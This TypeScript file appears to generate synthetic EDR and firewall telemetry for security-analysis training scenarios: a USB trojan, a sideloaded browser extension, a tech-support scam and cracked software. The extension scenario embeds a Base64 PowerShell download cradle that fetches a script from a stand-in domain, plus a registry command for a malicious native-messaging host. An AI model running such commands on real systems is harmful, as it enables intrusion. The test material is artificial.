        "crowdstrike.detection.scenario": "suspicious_removable_media_execution",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.severity": "High",
        "process.pid": "7712",
        "process.executable": "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
        "process.name": "USB_Backup_Tool.exe",
        "process.hash.sha256": fileHash,
        "process.signed": "false",
        "process.code_signature.status": "unsigned",
        "process.parent.name": "explorer.exe",
        "user.name": "NEXACORP\\m.levi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_usb_03_persist", ts: T(3 * MIN + 20_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "registry_set",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1547.001",
      description: "USB_Backup_Tool.exe wrote a Registry Run key on WS-OPS-2214 that relaunches it at every m.levi logon.",
      // The writer is the same process instance step 2 started (pid 7712), so the
      // registry record's actor links back to that process creation.
      process: {
        name: "USB_Backup_Tool.exe", pid: 7712, path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
        parent_name: "explorer.exe", parent_pid: 3140,
        user: "NEXACORP\\m.levi", integrity: "medium",
        hash: { sha256: fileHash },
      },
      registry: {
        path: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemBackupSvc",
        key: "SystemBackupSvc",
        value: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
      },
      raw: {
        "crowdstrike.event_simpleName": "AsepValueUpdate",
        "event.action": "registry_value_set",
        "registry.path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemBackupSvc",
        "registry.key": "SystemBackupSvc",
        "registry.value": "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
        "process.name": "USB_Backup_Tool.exe",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "user.name": "NEXACORP\\m.levi",
      },
    },
    {
      // A beacon before the kill — gives containment an indicator (domain + IP) beyond the file hash.
      id: "evt_usb_03b_beacon", ts: T(3 * MIN + 50_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 52140, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Domain },
      process: {
        name: "USB_Backup_Tool.exe", pid: 7712, path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
        parent_name: "explorer.exe", parent_pid: 3140, user: "NEXACORP\\m.levi", integrity: "medium", hash: { sha256: fileHash },
      },
      description: `USB_Backup_Tool.exe on WS-OPS-2214 connected to ${c2Domain} (${c2Ip}) on port 443.`,
      raw: {
        "crowdstrike.event_simpleName": "NetworkConnectIP4",
        "destination.ip": c2Ip, "destination.port": "443", "destination.domain": c2Domain,
        "source.ip": victim.ip, "source.port": "52140",
        "process.name": "USB_Backup_Tool.exe", "process.hash.sha256": fileHash,
        "host.name": victim.hostname, "user.name": "NEXACORP\\m.levi",
      },
    },
    {
      id: "evt_usb_04_detect", ts: T(5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1547.001",
      file: { path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe", sha256: fileHash, size: 245760 },
      description: "The EDR terminated USB_Backup_Tool.exe on WS-OPS-2214 and quarantined the file; the detection does not record the HKCU\\...\\Run SystemBackupSvc value being removed.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "threat.name": "Trojan:Win32/Wacatac.B!ml",
        "crowdstrike.detection.technique": "Boot or Logon Autostart Execution: Registry Run Keys",
        "crowdstrike.detection.technique_id": "T1547.001",
        "crowdstrike.detection.pattern_disposition": "2304",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File",
        "crowdstrike.detection.severity": "Critical",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "action_result": "process_killed, quarantined",
      },
    },
  ];

  return { title: "Malicious USB Drive → Trojan Persistence → Workstation Compromise", events, T, MIN, fileHash, c2Domain, c2Ip };
}

/** Telemetry half of `buildBrowserExtensionMalwareScenario`: the events and the story title, no answer key. */
export function browserExtensionMalwareScenarioEvents() {
  const B = new Date("2026-05-25T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-MKT-3301", email: "d.cohen@nexacorp.com", ip: "10.10.62.18" };
  const c2Domain = "cdn-assets-update.xyz";
  // Story-specific infrastructure (no other storyline uses this address).
  const c2Ip = "172.86.75.90";
  const dlDomain = "perf-boost-extension.net";
  const dlIp = "38.180.24.51";
  const stagerHash = makeSha256("browser_ext_stage2_payload");
  const zipHash = makeSha256("perf_boost_ext_unpacked_zip");
  const extId = "affloghcebbkcmnolgfhbiphpnbekoj";
  const extDir = "C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked";
  const nmHostCmd = `${extDir}\\host\\perf_boost_host.cmd`;
  const nmManifest = `${extDir}\\host\\com.perfboost.host.json`;
  // https payload, so the decoded URL scheme/port match the firewall egress (443).
  const encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAGEAcwBzAGUAdABzAC0AdQBwAGQAYQB0AGUALgB4AHkAegAvAGIALgBwAHMAMQAnACkA";

  const events: TelemetryEvent[] = [
    {
      // How the extension arrived: chrome downloaded a ZIP from a lure site, then
      // the unpacked folder (with its native-messaging manifest) appeared in Downloads.
      id: "evt_bext_00a_download", ts: T(-6 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1176.001",
      file: { path: `${extDir}.zip`, sha256: zipHash, size: 112640 },
      process: {
        name: "chrome.exe", pid: 8816, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      description: `chrome.exe on WS-MKT-3301 downloaded perf_boost_ext_unpacked.zip from ${dlDomain} to d.cohen's Downloads folder.`,
      raw: {
        "crowdstrike.event_simpleName": "ZipFileWritten",
        "file.path": `${extDir}.zip`,
        "file.hash.sha256": zipHash,
        "FileOriginUrl": `https://${dlDomain}/perf_boost_ext_unpacked.zip`,
        "FileOriginReferrerUrl": `https://${dlDomain}/install`,
        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
      },
    },
    {
      // The native-messaging host registration — the HKCU key that makes Chrome
      // willing to launch the host executable. Without this the launch below is impossible.
      id: "evt_bext_00b_nmreg", ts: T(-4 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "registry_set",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "medium", mitre_technique: "T1176.001",
      process: {
        name: "cmd.exe", pid: 7004, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: `cmd.exe /c reg add "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host" /ve /d "${nmManifest}" /f`,
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      registry: {
        path: "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host\\(Default)",
        key: "(Default)",
        value: nmManifest,
      },
      description: "A Chrome NativeMessagingHosts registration for com.perfboost.host was written under HKCU on WS-MKT-3301, pointing at a manifest in d.cohen's Downloads folder.",
      raw: {
        "crowdstrike.event_simpleName": "RegGenericValueUpdate",
        "registry.path": "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host\\(Default)",
        "registry.key": "(Default)",
        "registry.value": nmManifest,
        "process.name": "cmd.exe",
        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
      },
    },
    {
      id: "evt_bext_01_sideload", ts: T(0),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1176.001",
      description: "Chrome relaunched on WS-MKT-3301 with a --load-extension flag pointing to an unpacked folder in d.cohen's Downloads directory.",
      process: {
        name: "chrome.exe", pid: 8816, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\"",
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Persistence",
        "crowdstrike.detection.tactic_id": "TA0003",
        "crowdstrike.detection.technique": "Browser Extensions",
        "crowdstrike.detection.technique_id": "T1176.001",
        "crowdstrike.detection.severity": "Low",
        "crowdstrike.behaviors": "Developer-mode extension load flag|Extension folder outside Web Store cache path|Folder located in user Downloads",
        "event.action": "process_created",
        "process.pid": "8816",
        "process.executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "process.command_line": "--load-extension=\"C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\"",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3140",
        "user.name": "NEXACORP\\d.cohen",
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },
    {
      id: "evt_bext_02_nmhost", ts: T(1 * MIN + 30_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.003",
      // A Chrome extension can't launch processes itself; it messages a registered
      // native-messaging host, which Chrome runs. Here that host is a .cmd wrapper.
      description: "chrome.exe on WS-MKT-3301 launched its registered native-messaging host — cmd.exe running perf_boost_host.cmd with the extension's chrome-extension:// origin as an argument.",
      process: {
        name: "cmd.exe", pid: 9020, parent_name: "chrome.exe", parent_pid: 8816,
        cmdline: `cmd.exe /d /c "\"${nmHostCmd}\" chrome-extension://${extId}/"`,
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: Windows Command Shell",
        "crowdstrike.detection.technique_id": "T1059.003",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.behaviors": "Browser launched a native-messaging host|Host is a command-shell wrapper script|chrome-extension origin passed as an argument",
        "event.action": "process_created",
        "process.pid": "9020",
        "process.executable": "C:\\Windows\\System32\\cmd.exe",
        "process.command_line": `cmd.exe /d /c "\"${nmHostCmd}\" chrome-extension://${extId}/"`,
        "process.parent.name": "chrome.exe",
        "process.parent.pid": "8816",
        "user.name": "NEXACORP\\d.cohen",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_bext_03_powershell", ts: T(2 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001",
      description: "The native-messaging host on WS-MKT-3301 spawned powershell.exe with a hidden window and a Base64-encoded command.",
      process: {
        name: "powershell.exe", pid: 9024, parent_name: "cmd.exe", parent_pid: 9020,
        cmdline: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCmd}`,
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.behaviors": "Parent is a native-messaging host launched by a browser|Hidden window style|Base64-encoded command argument",
        "process.pid": "9024",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCmd}`,
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "9020",
        "user.name": "NEXACORP\\d.cohen",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_bext_04_beacon", ts: T(2 * MIN + 30_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { bytes_out: 3072, bytes_in: 40960, domain: c2Domain },
      description: "The firewall's URL filtering logged an alert for an HTTPS session from WS-MKT-3301 to cdn-assets-update.xyz, categorised as a newly registered domain; the session was allowed.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "53718",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
        "network.bytes_out": "3072", "network.bytes_in": "40960",
        "dns.query_domain": c2Domain,
        "url.category": "newly-registered-domain",
        "action_result": "allow",
      },
    },
    {
      // What the download cradle did before it was killed: wrote a second-stage script
      // to %TEMP%, giving the analyst the stage-2 artifact and hash.
      id: "evt_bext_04b_drop", ts: T(2 * MIN + 45_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1105",
      file: { path: "C:\\Users\\d.cohen\\AppData\\Local\\Temp\\b.ps1", sha256: stagerHash, size: 40960 },
      process: {
        name: "powershell.exe", pid: 9024, parent_name: "cmd.exe", parent_pid: 9020,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      description: "powershell.exe on WS-MKT-3301 wrote b.ps1 (40 KB) to d.cohen's %TEMP% folder.",
      raw: {
        "crowdstrike.event_simpleName": "NewScriptWritten",
        "file.path": "C:\\Users\\d.cohen\\AppData\\Local\\Temp\\b.ps1",
        "file.hash.sha256": stagerHash,
        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
      },
    },
    {
      id: "evt_bext_05_detect", ts: T(4 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1059.001",
      // The detection is about the PowerShell process (pid 9024), not the extension JS file.
      process: {
        name: "powershell.exe", pid: 9024, parent_name: "cmd.exe", parent_pid: 9020,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCmd}`,
        user: "NEXACORP\\d.cohen",
      },
      description: "The EDR terminated the encoded PowerShell process on WS-MKT-3301 that had been spawned through the browser native-messaging host.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.scenario": "suspicious_powershell_download_cradle",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_disposition": "2048",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, process killed.",
        "crowdstrike.detection.severity": "Critical",
        "host.name": victim.hostname,
        "action_result": "process_killed",
      },
    },
  ];

  return { title: "Sideloaded Browser Extension → Native-Messaging Host → PowerShell", events, T, MIN, c2Domain, c2Ip, stagerHash, dlDomain, dlIp, zipHash };
}

/** Telemetry half of `buildTechSupportScamScenario`: the events and the story title, no answer key. */
export function techSupportScamScenarioEvents() {
  const B = new Date("2026-05-27T14:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-ACC-4477", email: "t.mizrahi@nexacorp.com", ip: "10.10.71.29" };
  const toolHash = makeSha256("anydesk_portable_binary_legit_signed");
  const relayIp = "188.34.183.60"; // AnyDesk relay (Hetzner range), outbound 443
  const relayHost = "relay-a7f3c1.net.anydesk.com";
  const scamSite = "ms-support-alert.live";
  const scamIp = "154.216.17.39";
  const peerId = "1 581 927 344"; // incoming AnyDesk ID of the caller
  const peerIp = "102.89.44.17";  // caller's internet IP (from the connection trace)

  const events: TelemetryEvent[] = [
    {
      // The lure: the scareware page the user was sent to, which told them to call and install AnyDesk.
      id: "evt_rat_00_lure", ts: T(-3 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: scamIp, dst_port: 443, protocol: "tcp",
      severity: "medium",
      network: { url: `https://${scamSite}/alert/call-support`, domain: scamSite, method: "GET" },
      description: `WS-ACC-4477 loaded ${scamSite}/alert/call-support, which the firewall categorises as a scam/potentially-malicious page.`,
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "51990",
        "destination.ip": scamIp, "destination.port": "443",
        "network.application": "ssl", "pan.app": "web-browsing", "pan.action": "alert",
        "url.full": `https://${scamSite}/alert/call-support`,
        "url.category": "scam",
        "action_result": "allow",
      },
    },
    {
      id: "evt_rat_01_download", ts: T(0),
      source: "edr", vendor: "SentinelOne", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "low",
      file: { path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe", sha256: toolHash, size: 4192256 },
      // The browser wrote the download — chrome.exe is the actor of the file-create.
      process: {
        name: "chrome.exe", pid: 4120, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        user: "NEXACORP\\t.mizrahi", integrity: "medium",
      },
      description: "AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to t.mizrahi's Downloads folder on WS-ACC-4477.",
      raw: {
        "s1.eventType": "File Creation",
        "file.path": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        "file.hash.sha256": toolHash,
        "file.signed": "true",
        "file.signer": "philandro Software GmbH",
        "FileOriginUrl": "https://download.anydesk.com/AnyDesk.exe",
        "FileOriginReferrerUrl": `https://${scamSite}/alert/call-support`,
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_rat_02_execute", ts: T(4 * MIN),
      source: "edr", vendor: "SentinelOne", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1219.002",
      description: "t.mizrahi launched AnyDesk.exe on WS-ACC-4477; explorer.exe was the parent process.",
      process: {
        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        cmdline: "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
        user: "NEXACORP\\t.mizrahi", integrity: "medium",
        hash: { sha256: toolHash },
      },
      raw: {
        "s1.eventType": "Process Creation",
        "s1.mitigation_status": "not_mitigated",
        "process.name": "AnyDesk.exe",
        "process.pid": "5212",
        "process.executable": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        "process.command_line": "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
        "process.parent.name": "explorer.exe",
        "process.hash.sha256": toolHash,
        "file.signed": "true",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
        "action_result": "allowed",
      },
    },
    {
      id: "evt_rat_03_relay", ts: T(4 * MIN + 40_000),
      source: "edr", vendor: "SentinelOne", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: relayIp, dst_port: 443, src_port: 52118, protocol: "tcp",
      severity: "medium", mitre_technique: "T1219.002",
      network: { domain: relayHost, bytes_out: 81920, bytes_in: 614400 },
      description: `AnyDesk.exe on WS-ACC-4477 opened an outbound session to an AnyDesk relay (${relayHost}).`,
      process: {
        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        cmdline: "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
      },
      raw: {
        "s1.eventType": "IP Connect",
        "process.name": "AnyDesk.exe",
        "process.pid": "5212",
        "process.hash.sha256": toolHash,
        "source.ip": victim.ip, "source.port": "52118",
        "destination.ip": relayIp, "destination.port": "443",
        "destination.domain": relayHost,
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.direction": "outbound",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
        "action_result": "allowed",
      },
    },
    {
      // The AnyDesk trace file names the incoming session's ID and the remote peer's IP —
      // the only record that identifies the caller.
      id: "evt_rat_03b_trace", ts: T(4 * MIN + 55_000),
      source: "edr", vendor: "SentinelOne", event_type: "file_modify",
      hostname: victim.hostname, user_email: victim.email,
      severity: "medium", mitre_technique: "T1219.002",
      file: { path: "C:\\Users\\t.mizrahi\\AppData\\Roaming\\AnyDesk\\connection_trace.txt", size: 2048 },
      process: {
        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
      },
      description: `AnyDesk recorded an incoming interactive session (ID ${peerId}, remote address ${peerIp}) in its connection_trace.txt on WS-ACC-4477.`,
      raw: {
        "s1.eventType": "File Modification",
        "file.path": "C:\\Users\\t.mizrahi\\AppData\\Roaming\\AnyDesk\\connection_trace.txt",
        "anydesk.incoming_id": peerId,
        "anydesk.remote_address": peerIp,
        "anydesk.direction": "Incoming",
        "process.name": "AnyDesk.exe",
        "process.hash.sha256": toolHash,
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_rat_04_shell", ts: T(4 * MIN + 90_000),
      source: "edr", vendor: "SentinelOne", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "medium", mitre_technique: "T1059.003",
      description: "While the AnyDesk session was live, explorer.exe on WS-ACC-4477 started cmd.exe, which ran systeminfo and netstat.",
      process: {
        name: "cmd.exe", pid: 5540, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "cmd.exe /c systeminfo & netstat -ano",
        user: "NEXACORP\\t.mizrahi", integrity: "medium",
      },
      raw: {
        "s1.eventType": "Process Creation",
        "process.name": "cmd.exe",
        "process.pid": "5540",
        "process.command_line": "cmd.exe /c systeminfo & netstat -ano",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3140",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
      },
    },
    {
      // Post-session action: the operator installs AnyDesk as a service for unattended access.
      id: "evt_rat_04b_install", ts: T(5 * MIN + 40_000),
      source: "edr", vendor: "SentinelOne", event_type: "service_install",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1543.003",
      description: "AnyDesk was installed as a Windows service (AnyDesk) on WS-ACC-4477, which keeps it running for unattended access after the user logs off.",
      process: {
        name: "AnyDesk.exe", pid: 6020, parent_name: "services.exe", parent_pid: 836,
        path: "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
        user: "NT AUTHORITY\\SYSTEM", integrity: "system", hash: { sha256: toolHash },
      },
      raw: {
        "s1.eventType": "Service Installation",
        "service.name": "AnyDesk",
        "service.start_type": "2",
        "service.account": "LocalSystem",
        "process.name": "AnyDesk.exe",
        "process.executable": "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
        "process.hash.sha256": toolHash,
        "process.parent.name": "services.exe",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_rat_05_detect", ts: T(6 * MIN),
      source: "edr", vendor: "SentinelOne", event_type: "edr_alert",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1219.002",
      is_detection: true,
      file: { path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe", sha256: toolHash, size: 4192256 },
      process: {
        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
      },
      description: "SentinelOne raised a behavioural alert for an unsanctioned remote-access tool (AnyDesk) with a live external relay session on WS-ACC-4477 and terminated its processes.",
      raw: {
        "s1.eventType": "Threats",
        "s1.detection.classification": "PUA",
        "s1.detection.classification_source": "Behavioral Engine",
        "s1.mitigation_status": "mitigated",
        "threat.name": "PUA.RemoteAdmin.AnyDesk",
        "s1.threat.id": "TH-441-2026",
        "process.name": "AnyDesk.exe",
        "process.hash.sha256": toolHash,
        "file.path": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        "file.hash.sha256": toolHash,
        "host.name": victim.hostname,
        "action_result": "process_killed",
      },
    },
  ];

  return { title: "Tech-Support Scam → Unapproved Remote Access Tool", events, T, MIN, toolHash, scamSite, scamIp, relayHost, relayIp, peerId };
}

/** Telemetry half of `buildCrackedSoftwareScenario`: the events and the story title, no answer key. */
export function crackedSoftwareScenarioEvents() {
  const B = new Date("2026-05-29T20:10:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-ENG-2093", email: "y.golan@nexacorp.com", ip: "10.10.48.55" };
  const downloadDomain = "fast-office-tools-download.top";
  // Story-specific infrastructure (no other storyline uses these addresses).
  const downloadIp = "103.224.182.47";
  const c2Domain = "office-license-check.info";
  const c2Ip = "45.95.147.62";
  const installerHash = makeSha256("office_activator_setup_installer");
  const payloadHash = makeSha256("cracked_installer_dropped_payload");
  const installerPath = "C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe";
  const svchelperPath = "C:\\ProgramData\\OfficeTools\\svchelper.exe";

  const events: TelemetryEvent[] = [
    {
      id: "evt_crack_01_download", ts: T(0),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: downloadIp, dst_port: 443, protocol: "tcp",
      severity: "low",
      network: { url: `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`, domain: downloadDomain, method: "GET", bytes_out: 2048, bytes_in: 18874368 },
      file: { name: "Office_Pro_2026_Activator_Setup.exe", path: "Office_Pro_2026_Activator_Setup.exe", sha256: installerHash, size: 18874368 },
      description: "WS-ENG-2093 downloaded Office_Pro_2026_Activator_Setup.exe (Windows executable) over HTTPS from fast-office-tools-download.top at 20:10.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "58122",
        "destination.ip": downloadIp, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
        "url.full": `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`,
        "pan.filename": "Office_Pro_2026_Activator_Setup.exe",
        "url.category": "questionable",
        "action_result": "allow",
      },
    },
    {
      id: "evt_crack_01b_save", ts: T(30_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1204.002",
      file: { path: installerPath, sha256: installerHash, size: 18874368 },
      process: {
        name: "chrome.exe", pid: 4120, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        user: "NEXACORP\\y.golan", integrity: "medium",
      },
      description: "chrome.exe on WS-ENG-2093 saved Office_Pro_2026_Activator_Setup.exe to y.golan's Downloads folder.",
      raw: {
        "ActionType": "FileCreated",
        "FileName": "Office_Pro_2026_Activator_Setup.exe",
        "FolderPath": installerPath,
        "SHA256": installerHash,
        "FileOriginUrl": `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`,
        "FileOriginReferrerUrl": `https://${downloadDomain}/office-activator`,
        "InitiatingProcessFileName": "chrome.exe",
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "ReportId": "889210",
      },
    },
    {
      id: "evt_crack_02_execute", ts: T(6 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "y.golan ran Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 with explorer.exe as the parent process; the binary is unsigned.",
      process: {
        name: "Office_Pro_2026_Activator_Setup.exe", pid: 6120, parent_name: "explorer.exe", parent_pid: 3140,
        path: installerPath,
